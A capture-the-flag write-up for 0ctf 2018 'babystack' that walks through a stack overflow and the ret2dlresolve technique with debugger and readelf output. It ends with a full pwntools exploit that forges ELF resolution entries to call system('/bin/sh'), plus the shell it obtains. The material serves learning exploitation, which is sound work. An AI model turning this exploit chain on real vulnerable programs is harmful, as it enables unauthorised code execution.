# 0ctf 2018 Babystack

This writeup is based off of these resources:
```
https://github.com/sajjadium/ctf-writeups/tree/master/0CTFQuals/2018/babystack
https://kileak.github.io/ctf/2018/0ctf-qual-babystack/
```

The objective of this challenge is to pop a shell, but without using an infoleak. The challenge originally used some python scripting to enforce this, however I did not use it. I know people could take the easy way out with how I have it, but where is the fun in that?

Let's take a look at the binary:

```
$    file babystack
babystack: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=76b50d733400542b34d5e8fa23f0f12dc951d4ef, stripped
$    pwn checksec babystack
[*] '/Hackery/pod/modules/ret2_csu_dl/0ctf18_babystack/babystack'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
$    ./babystack
15935728
```

So we can see that we are dealing with a `32` bit elf, that has a Non-Executable stack. When we run it, it prompts us for input.

## Reversing

When we take a look at the binary in Ghidra, we don't immediately see a `main` function. However we see this function at `0x0804843b`:

```
void scanInput(void)

{
  undefined input [40];
 
  read(0,input,0x40);
  return;
}
```

We can see here that it is scanning in `0x40` (`64`) bytes worth of data in a `40` byte chunk, giving us a `24` byte overflow. When we set a breakpoint for the `read` call in the function at `0x804844c`, we see that it is indeed called (so this function is what was scanning in our input). When we check the offset between the start of our input and the return address, we see that it is `44` bytes.

## Exploitation

So we have an obvious stack overflow bug. However how will we land it? Infoleaks are out of the question, so we can't do a ret2libc attack (returning to gadgets/functions/code in the libc). Also we don't have a libc file provided, so one more reason why ret2lic isn't feasible. It is a dynamically linked binary with a small code base, so we don't have many gadgets to work with. The only imported functions are `alarm` and `read`, and since our input has to be given as a single chunk, that doesn't help us too much. The answer to this is we will be performing a `ret2dlresolve` attack.

#### ret2dlresolve

So dynamically linked binaries are linked with a libc file when they are executed. This provides several advantages such as a smaller binary size. However since when the binary is compiled it doesn't know where functions in libc will be since it is linked at runtime, it has to go through a process of linking it at run time. The tl;dr of this is it essentially just looks up what the libc address of a function it is trying to link, and writes it to a section of memory in the binary, so it can call the libc function. A ret_2_dlresolve attack targets that functionality. First let's talk about how this process works before we talk about how we will attack it.

Elf binaries use something called `Delayed Binding`, which means that the linking process happens when the binary first tries to execute a libc function. To understand that, let's look at what the GOT addresses are for `read` before it is called:

Got table entries for `read` and `alarm` in `.got.plt`:
```
                             PTR_read_0804a00c                               XREF[1]:     read:08048300  
        0804a00c 00 b0 04 08     addr       read                                             = ??
                             PTR_alarm_0804a010                              XREF[1]:     alarm:08048310  
        0804a010 04 b0 04 08     addr       alarm                                            = ??
```

Now let's see what it is

```
gef➤  b *0x804844c
Breakpoint 1 at 0x804844c
gef➤  r
Starting program: /Hackery/pod/modules/ret2_csu_dl/0ctf18_babystack/babystack

Breakpoint 1, 0x0804844c in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffd0d0  →  0xffffd108  →  0x00000000
$ebx   : 0x0       
$ecx   : 0xffffd120  →  0x00000001
$edx   : 0x0       
$esp   : 0xffffd0c0  →  0x00000000
$ebp   : 0xffffd0f8  →  0xffffd108  →  0x00000000
$esi   : 0xf7fb5000  →  0x001dbd6c
$edi   : 0xf7fb5000  →  0x001dbd6c
$eip   : 0x0804844c  →  0xfffeafe8  →  0x00000000
$eflags: [zero carry PARITY ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd0c0│+0x0000: 0x00000000     ← $esp
0xffffd0c4│+0x0004: 0xffffd0d0  →  0xffffd108  →  0x00000000
0xffffd0c8│+0x0008: 0x00000040 ("@"?)
0xffffd0cc│+0x000c: 0xf7fb5000  →  0x001dbd6c
0xffffd0d0│+0x0010: 0xffffd108  →  0x00000000
0xffffd0d4│+0x0014: 0xf7fe9790  →   pop edx
0xffffd0d8│+0x0018: 0xffffd144  →  0x00000000
0xffffd0dc│+0x001c: 0xffffd108  →  0x00000000
──────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048446                  lea    eax, [ebp-0x28]
    0x8048449                  push   eax
    0x804844a                  push   0x0
 →  0x804844c                  call   0x8048300 <read@plt>
   ↳   0x8048300 <read@plt+0>     jmp    DWORD PTR ds:0x804a00c
       0x8048306 <read@plt+6>     push   0x0
       0x804830b <read@plt+11>    jmp    0x80482f0
       0x8048310 <alarm@plt+0>    jmp    DWORD PTR ds:0x804a010
       0x8048316 <alarm@plt+6>    push   0x8
       0x804831b <alarm@plt+11>   jmp    0x80482f0
──────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
read@plt (
   [sp + 0x0] = 0x00000000,
   [sp + 0x4] = 0xffffd0d0 → 0xffffd108 → 0x00000000,
   [sp + 0x8] = 0x00000040,
   [sp + 0xc] = 0xf7fb5000 → 0x001dbd6c
)
──────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "babystack", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804844c → call 0x8048300 <read@plt>
[#1] 0x804847a → mov eax, 0x0
[#2] 0xf7df7751 → __libc_start_main()
[#3] 0x8048361 → hlt
─────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/w 0x804a00c
0x804a00c <read@got.plt>:    0x8048306
gef➤  x/i 0x8048306
   0x8048306 <read@plt+6>:    push   0x0
gef➤  x/6i 0x8048300
   0x8048300 <read@plt>:    jmp    DWORD PTR ds:0x804a00c
   0x8048306 <read@plt+6>:    push   0x0
   0x804830b <read@plt+11>:    jmp    0x80482f0
   0x8048310 <alarm@plt>:    jmp    DWORD PTR ds:0x804a010
   0x8048316 <alarm@plt+6>:    push   0x8
   0x804831b <alarm@plt+11>:    jmp    0x80482f0
```

So we can see that the got entry for read points to `read@plt+6`. For the `read@plt` function, we can see that it starts off by jumping to whatever value is stored in the got entry for `read` (stored at `0x804a00c`). Proceeding that it will push `0x0` on to the stack (offset for the read symbol), and jump to `0x80482f0`. When we look at `0x80482f0` we see this:

```
gef➤  x/10i 0x80482f0
   0x80482f0:    push   DWORD PTR ds:0x804a004
   0x80482f6:    jmp    DWORD PTR ds:0x804a008
   0x80482fc:    add    BYTE PTR [eax],al
   0x80482fe:    add    BYTE PTR [eax],al
   0x8048300 <read@plt>:    jmp    DWORD PTR ds:0x804a00c
   0x8048306 <read@plt+6>:    push   0x0
   0x804830b <read@plt+11>:    jmp    0x80482f0
gef➤  x/w 0x804a008
0x804a008:    0xf7fe9780
```

So we can see it pushes the DWORD stored at `0x804a004` onto the stack. Then it jumps to the instruction pointer stored in `0x804a008`. This function is `_dl_runtime_resolve`, and the value pushed before it is the link map. Even though there isn't a symbol for `_dl_runtime_resolve`, we can see that it's address is in the middle of some `_dl` functions:

```
gef➤  info functions
All defined functions:

.    .    .    

0xf7fe7570  _dl_make_stack_executable
0xf7fe7830  _dl_find_dso_for_object
0xf7fe9910  _dl_exception_create
0xf7fe9a10  _dl_exception_create_format
0xf7fe9d60  _dl_exception_free
0xf7feae80  __tunable_get_val
```

We can actually see the `_dl_runtime_resolve` function here:

```
gef➤  x/11i 0xf7fe9780
   0xf7fe9780:    push   eax
   0xf7fe9781:    push   ecx
   0xf7fe9782:    push   edx
   0xf7fe9783:    mov    edx,DWORD PTR [esp+0x10]
   0xf7fe9787:    mov    eax,DWORD PTR [esp+0xc]
   0xf7fe978b:    call   0xf7fe3af0 # Function which resolves the libc function address (_dl_fixup)
   0xf7fe9790:    pop    edx # Resolved libc address stored in eax (return value holder)
   0xf7fe9791:    mov    ecx,DWORD PTR [esp]
   0xf7fe9794:    mov    DWORD PTR [esp],eax # Store resolved libc address on the top of the stack ([esp])
   0xf7fe9797:    mov    eax,DWORD PTR [esp+0x4]
   0xf7fe979b:    ret    0xc # return to the libc function which we worked on resolving
```

When it goes through the process of linking the function, it needs to actually know which function it is linking (whether it be `puts`, `system`, or `read`). This is done by giving an offset to the symbol table (remember the `push 0x0` earlier).

After `read@plt` is executed we can see that the got entry points to the libc address for `read`. That way whenever `read@plt` is called again, it will just jump to the got entry for it, which will be a libc address:

```
──────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x804846d                  call   0x8048310 <alarm@plt>
    0x8048472                  add    esp, 0x10
    0x8048475                  call   0x804843b
 →  0x804847a                  mov    eax, 0x0
    0x804847f                  mov    ecx, DWORD PTR [ebp-0x4]
    0x8048482                  leave  
    0x8048483                  lea    esp, [ecx-0x4]
    0x8048486                  ret    
    0x8048487                  xchg   ax, ax
──────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "babystack", stopped, reason: TEMPORARY BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804847a → mov eax, 0x0
[#1] 0xf7df7751 → __libc_start_main()
[#2] 0x8048361 → hlt
─────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/w 0x804a00c
0x804a00c <read@got.plt>:    0xf7ec67e0
gef➤  x/i 0xf7ec67e0
   0xf7ec67e0 <read>:    push   esi
gef➤  p read
$2 = {<text variable, no debug info>} 0xf7ec67e0 <read>
```

Our attack will be to essentially create a fake symbols table (`symtab`), with a known offset to a fake symbol. If we were to pass this to `_dl_runtime_resolve`, it would call `_dl_fixup` which would turn around to resolve and execute that symbol (assuming it resolves to an actual libc function). That is what we will do to execute `system`.

#### Scanning in more data

So to scan in the full payload for the `ret2dl`, we won't be able to fit it into the initial `64` bytes worth of data. So we will have to be making another call to `read`. We will be scanning it into `0x804a020`, which is the start of the `bss`. This is where we will store the things needed for the `ret_2_dl_reslove`:

```
payload0 += "0"*44                        # Filler from start of input to return address
payload0 += p32(elf.symbols['read'])    # Return read
payload0 += scanInput                    # After the read call, return to scan input
payload0 += p32(0)                        # Read via stdin
payload0 += p32(bss)                    # Scan into the start of the bss
payload0 += p32(payload1_size)            # How much data to scan in
```

After that, we will jump back to the `scanInput` function, so we can re-exploit the bug again. This time we will just jump to `0x80482f0` with the arguments being `rel_plt_entry_index` and `/bin/sh` to call a shell.

## Executing ret_2_dl_resolve

Now to actually execute the attack, we will be needing to create some fake entries. First, let's take a look at all of the sections in this binary. Also just to be clear, our goal is to run the libc `system` function:

```
$    readelf -S babystack
There are 29 section headers, starting at offset 0x1150:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000060 10   A  6   1  4
  [ 6] .dynstr           STRTAB          0804822c 00022c 000050 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          0804827c 00027c 00000c 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         08048288 000288 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             080482a8 0002a8 000008 08   A  5   0  4
  [10] .rel.plt          REL             080482b0 0002b0 000018 08  AI  5  24  4
  [11] .init             PROGBITS        080482c8 0002c8 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        080482f0 0002f0 000040 04  AX  0   0 16
  [13] .plt.got          PROGBITS        08048330 000330 000008 00  AX  0   0  8
  [14] .text             PROGBITS        08048340 000340 0001b2 00  AX  0   0 16
  [15] .fini             PROGBITS        080484f4 0004f4 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        08048508 000508 000008 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        08048510 000510 000034 00   A  0   0  4
  [18] .eh_frame         PROGBITS        08048544 000544 0000ec 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [24] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4
  [25] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
  [26] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1
  [27] .comment          PROGBITS        00000000 001020 000034 01  MS  0   0  1
  [28] .shstrtab         STRTAB          00000000 001054 0000fa 00      0   0  1
```

We will be creating entries for the following sections:

```
.rel.plt     (Elf_Rel entry)
.dynsym     (Elf_Sym entry)
.dynstr
```

#### .rel.plt

The `.rel.plt` section is used for function relocation. The `.rel.dyn` is used for variable relocation. Let's take a look at this section:

```
$    readelf -r babystack

Relocation section '.rel.dyn' at offset 0x2a8 contains 1 entry:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__

Relocation section '.rel.plt' at offset 0x2b0 contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   alarm@GLIBC_2.0
0804a014  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
```

And in memory:

```
gef➤  x/8w 0x80482a8
0x80482a8:    0x08049ffc    0x00000306    0x0804a00c    0x00000107
0x80482b8:    0x0804a010    0x00000207    0x0804a014    0x00000407
gef➤  x/w 0x804a014
0x804a014 <__libc_start_main@got.plt>:    0xf7df7660
gef➤  x/w 0x804a010
0x804a010 <alarm@got.plt>:    0xf7e9e480
```

Also let's look at the code for one of the entries:

```
  Typedef struct {
  Elf32_Addr r_offset; // got.plt entry
  Elf32_Word r_info; // index from symbol table
  } Elf32_Rel;
```

So we can see that each entry contains two DWORDS. The first dword is the `got.plt` entry for the function. The second is it's `r_info` (which is it's index form the symbol table).

When we make our fake `.rel.plt`, we will need two things. The first is a fake `got` entry address to give it, which the libc address for `system` will be written to (I tried different got entry addresses, and it didn't really seem to affect it).

For the `r_info` value (which is the index to the `dynsm` entry), we will be needing to calculate that. Remember, we are storing these entries at the start of the `bss`. With how these entries work, the `dynsm` entry will be stored at `start_of_bss + 0xc`. When we look at the `dynsym` next, we see that the `dynsm` entries start at an offset of `0x10` from the start, and we see one every `0x10` bytes after it (until we reach the end). So in order to find the right `r_info` index, we will take the address of where `.dynsym` is stored (`start_of_bss + 0xc`), and subtract from it the start of the `.dynsym` segment, and divide it by `0x10`. After that we will need to shift it over to the left by `0x8` (it's how the indexes are stored, you will see why that is).

#### .dynsym

This section contains a dynamic symbol link table. Let's take a look at this section of the binary in Ghidra:

```
                             //
                             // .dynsym
                             // SHT_DYNSYM  [0x80481cc - 0x804822b]
                             // ram: 080481cc-0804822b
                             //
                             __DT_SYMTAB                                     XREF[2]:     08049f60(*),
                                                                                          _elfSectionHeaders::000000d4(*)  
        080481cc 00 00 00        Elf32_Sy
                 00 00 00
                 00 00 00
           080481cc 00 00 00 00 00  Elf32_Sym                         [0]                               XREF[2]:     08049f60(*),
                    00 00 00 00 00                                                                                   _elfSectionHeaders::000000d4(*)  
                    00 00 00 00 00
              080481cc 00 00 00 00     ddw       0h                      st_name                           XREF[2]:     08049f60(*),
                                                                                                                        _elfSectionHeaders::000000d4(*)  
              080481d0 00 00 00 00     ddw       0h                      st_value
              080481d4 00 00 00 00     ddw       0h                      st_size
              080481d8 00              db        0h                      st_info
              080481d9 00              db        0h                      st_other
              080481da 00 00           dw        0h                      st_shndx
           080481dc 1a 00 00 00 00  Elf32_Sym                         [1]           read
                    00 00 00 00 00
                    00 00 12 00 00
           080481ec 1f 00 00 00 00  Elf32_Sym                         [2]           alarm
                    00 00 00 00 00
                    00 00 12 00 00
           080481fc 37 00 00 00 00  Elf32_Sym                         [3]           __gmon_start__
                    00 00 00 00 00
                    00 00 20 00 00
           0804820c 25 00 00 00 00  Elf32_Sym                         [4]           __libc_start_main
                    00 00 00 00 00
                    00 00 12 00 00
           0804821c 0b 00 00 00 0c  Elf32_Sym                         [5]           _IO_stdin_used
                    85 04 08 04 00
                    00 00 11 00 10
```

So we can see here, there are entries for the imported functions. Thing is the `r_info` values actually corresponds to the indexes here. The equation is `index = (r_info >> 8)`. For instance above we saw that the `r_info` value for `alarm` was `0x00000207`. This would correspond to and index of `0x207 >> 8 = 2`, which we can see is the index to alarm.

Now for the values stored in the various entries that `r_info` maps to. Each entry contains `0x10` bytes, so 4 DWORDS. Now for everything that we will want libc to link, there is a string that represents the symbol we want to link, that we will give to libc. These are stored in the `.dynstr` section. The first DWORD represents the offset from the start of the section to that. The start of the `.dynstr` section is `0x804822c`. We can see that the offset `alarm` gives us is `0x1f`. We can see that `0x804822c + 0x1f = 0x804824b`, which is the address of the `.dynstr` entry for `alarm`. For this value, we will just take where our `.dynstr` entry will be for `system` (a little bit after the start of the bss), and subtract it from the start of the `.dynstr` section, to get the offset. For what we are trying to do, we can just set the other 3 DWORDS to `0x0` (from what I've seen, as long as it's less than `0x100`, it should work).

#### .dynstr

Now this section contains the strings for the symbols that we want to link. When we take a look at this section of the binary in Ghidra, we see this:

```
                             //
                             // .dynstr
                             // SHT_STRTAB  [0x804822c - 0x804827b]
                             // ram: 0804822c-0804827b
                             //
                             __DT_STRTAB                                     XREF[2]:     08049f58(*),
                                                                                          _elfSectionHeaders::000000fc(*)  
        0804822c 00              ??         00h
        0804822d 6c 69 62        ds         "libc.so.6"
                 63 2e 73
                 6f 2e 36 00
        08048237 5f 49 4f        ds         "_IO_stdin_used"
                 5f 73 74
                 64 69 6e
        08048246 72 65 61        ds         "read"
                 64 00
        0804824b 61 6c 61        ds         "alarm"
                 72 6d 00
        08048251 5f 5f 6c        ds         "__libc_start_main"
                 69 62 63
                 5f 73 74
        08048263 5f 5f 67        ds         "__gmon_start__"
                 6d 6f 6e
                 5f 73 74
        08048272 47 4c 49        ds         "GLIBC_2.0"
                 42 43 5f
                 32 2e 30 00
```

So we can see strings in there for `read` and `alarm`, so libc can link them. This essentially tells libc what to link. For this, we will just put the string `system`. The previous entry already took care of the index.

Also one last thing, since we need a pointer to `/bin/sh`, we will just store that at the end of the bss.

#### Time to ret 2 dl_resolve

So that will be the entries we store in the bss. We are ready to actually execute the `ret_2_dl_resolve`. Leaving off from the `read` call we made, we will end up back in the `scanInput` function which we will exploit the buffer overflow again to take control of `eip`. With that we will call the `0x80482f0` function (the one that is jumped to @ `plt+6`, and starts the linking process). We will pass it the `.rel.plt` index for our fake entry. Since our fake entry starts at the beginning of the `bss` (`0x804a020`), and this index is just the distance from the start of the `.rel.plt` section (`0x80482b0`) to the entry, this index will just be `0x804a020 - 0x80482b0 = 0x1d70`. After that we will pass our arguments to the function, which in this case will just be the address of `/bin/sh` which we stored in the `bss`.

## Exploit

Bringing it all together, we have the following exploit:

```
# This exploit is based off of: https://github.com/sajjadium/ctf-writeups/tree/master/0CTFQuals/2018/babystack

from pwn import *

target = process('./babystack')
#gdb.attach(target)

elf = ELF('babystack')

# Establish starts of various sections
bss = 0x804a020

dynstr = 0x804822c

dynsym = 0x80481cc

relplt = 0x80482b0

# Establish two functions

scanInput = p32(0x804843b)
resolve = p32(0x80482f0)

# Establish size of second payload

payload1_size = 43

# Our first scan
# This will call read to scan in our fake entries into the plt
# Then return back to scanInput to re-exploit the bug

payload0 = ""

payload0 += "0"*44                        # Filler from start of input to return address
payload0 += p32(elf.symbols['read'])    # Return read
payload0 += scanInput                    # After the read call, return to scan input
payload0 += p32(0)                        # Read via stdin
payload0 += p32(bss)                    # Scan into the start of the bss
payload0 += p32(payload1_size)            # How much data to scan in


target.send(payload0)

# Our second scan
# This will be scanned into the start of the bss
# It will contain the fake entries for our ret_2_dl_resolve attack

# Calculate the r_info value
# It will provide an index to our dynsym entry
dynsym_offset = ((bss + 0xc) - dynsym) / 0x10
r_info = (dynsym_offset << 8) | 0x7

# Calculate the offset from the start of dynstr section to our dynstr entry
dynstr_index = (bss + 28) - dynstr

paylaod1 = ""

# Our .rel.plt entry
paylaod1 += p32(elf.got['alarm'])
paylaod1 += p32(r_info)

# Empty
paylaod1 += p32(0x0)

# Our dynsm entry
paylaod1 += p32(dynstr_index)
paylaod1 += p32(0xde)*3

# Our dynstr entry
paylaod1 += "system\x00"

# Store "/bin/sh" here so we can have a pointer ot it
paylaod1 += "/bin/sh\x00"

target.send(paylaod1)

# Our third scan, which will execute the ret_2_dl_resolve
# This will just call 0x80482f0, which is responsible for calling the functions for resolving
# We will pass it the `.rel.plt` index for our fake entry
# As well as the arguments for system

# Calculate address of "/bin/sh"
binsh_bss_address = bss + 35

# Calculate the .rel.plt offset
ret_plt_offset = bss - relplt


paylaod2 = ""

paylaod2 += "0"*44
paylaod2 += resolve                 # 0x80482f0
paylaod2 += p32(ret_plt_offset)        # .rel.plt offset
paylaod2 += p32(0xdeadbeef)            # The next return address after 0x80482f0, really doesn't matter for us
paylaod2 += p32(binsh_bss_address)    # Our argument, address of "/bin/sh"

target.send(paylaod2)

# Enjoy the shell!
target.interactive()
```

When we run it:

```
$    python exploit.py
[+] Starting local process './babystack': pid 10847
[*] '/Hackery/pod/modules/ret2_csu_dl/0ctf18_babystack/babystack'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode
$ w
 23:51:29 up  6:59,  1 user,  load average: 0.18, 0.12, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               16:58   ?xdm?   8:04   0.00s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --session=ubuntu
$ ls
babystack  exploit.py  readme.md
```

Just like that, we popped a shell!